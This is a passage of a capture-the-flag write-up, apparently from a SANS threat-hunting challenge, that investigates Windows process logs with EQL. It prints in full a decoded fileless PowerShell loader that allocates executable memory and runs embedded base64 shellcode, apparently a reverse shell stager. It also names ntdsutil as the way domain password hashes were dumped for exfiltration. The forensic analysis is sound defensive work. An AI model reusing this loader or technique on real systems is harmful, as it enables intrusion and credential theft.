jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))", "event_type": "process", "logon_id": 999, "parent_process_name": "powershell.exe", "parent_process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 2564, "ppid": 3824, "process_name": "powershell.exe", "process_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", "subtype": "create", "timestamp": 132186397863620000, "unique_pid": "{7431d376-deaa-5dd3-0000-0010948f4f00}", "unique_ppid": "{7431d376-dea9-5dd3-0000-00108f774f00}", "user": "NT AUTHORITY\\SYSTEM", "user_domain": "NT AUTHORITY", "user_name": "SYSTEM"}
9 results found
{% endhighlight %}

This looks nasty. We can see a rather large base64-encoded blob which is decoded (by [System.Convert]::FromBase64String), then decompressed (by System.IO.Compression.GzipStream) and executed as PowerShell script
Let's have a look at the executed code:

{% highlight bash %}
echo -n "H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA" | base64 -d > script.ps.gz
gunzip script.ps.gz
{% endhighlight %}

And here's the result:
{% highlight powershell %}
function uM1F {
  Param ($i46, $zVytt)
  $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

  return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))
}

function nL9 {
  Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
    [Parameter(Position = 1)] [Type] $mVd_U = [Void]
  )

  $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
  $yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')
  $yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')

  return $yv.CreateType()
}

[Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")

$oDm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($dc, 0, $oDm, $dc.length)

$lHZX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
{% endhighlight %}

Some minutes spent on Google show that [someone else already encountered this before](https://isc.sans.edu/forums/diary/Fileless+Malicious+PowerShell+Sample/23081/).
The other suspicious event look fairly similar; they all contain the same PowerShell code, only obfuscated with different variable names.
This is interesting ... but unfortunately, this does not tell us how the domain password hashes were retrieved by the attacker.

Let's take a step back. To have a high-level view of what this user did, let's look at the different commands used, by looking at the different values of the field `process_name`:
{% highlight bash %}
eql> search process where logon_id == 999 | count process_name
{"count": 1, "key": "ntdsutil.exe", "percent": 0.00041631973355537054}
{"count": 6, "key": "powershell.exe", "percent": 0.002497918401332223}
{"count": 7, "key": "cmd.exe", "percent": 0.0029142381348875937}
{"count": 2388, "key": "net.exe", "percent": 0.9941715237302248}
4 results found
{% endhighlight %}

We went straight for the PowerShell events, but the first line above is interesting: [`ntdsutil`](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v%3Dws.11)) is an util that can be used to perform various maintenance activities on Active Directory Domain Services. The [second hint given by Mary](https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/) confirms that this tool can be used to create a backup of a domain password hashes, which can then be exfiltrated. `ntdsutil` is the key of the second challenge!

{% highlight bash %}
{% endhighlight %}


